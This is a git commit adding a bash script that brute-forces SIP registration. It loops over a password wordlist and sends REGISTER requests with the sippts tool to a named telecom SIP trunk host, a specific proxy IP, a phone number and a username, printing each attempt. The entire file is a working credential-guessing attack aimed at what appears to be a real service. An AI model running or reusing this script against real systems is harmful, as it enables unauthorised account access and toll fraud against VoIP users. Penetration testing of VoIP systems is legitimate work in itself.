e96fe0a95167d20d2b5f7b03a6d74331ee301cb2
Nabih <nabih@fuzzinglabs.com>
2024-10-09 16:24:37 +0200

    add bash script for bruteforce

---
+++ bruteforce.sh
@@ -0,0 +1,29 @@
+#!/bin/bash
+
+# Check if wordlist.txt exists
+if [ ! -f wordlist.txt ]; then
+    echo "wordlist.txt not found!"
+    exit 1
+fi
+
+# Iterate over each line in wordlist.txt
+while IFS= read -r password; do
+    echo "Trying password: $password"
+    
+    # Execute the sippts command with the current password
+    ./build/scripts-3.12/sippts send \
+    -i siptrunk2.ver.sul.t-online.de \
+    -r 5060 \
+    -p tcp \
+    -proxy 80.156.100.67:5060 \
+    -m register \
+    -fu +491244378510 \
+    -fd siptrunk2.ver.sul.t-online.de \
+    -td siptrunk2.ver.sul.t-online.de \
+    -ua "PhonerLite/3.26" \
+    -user 550214025190 \
+    -pass "$password" \
+    -v \
+    -d siptrunk2.ver.sul.t-online.de
+
+done < wordlist.txt
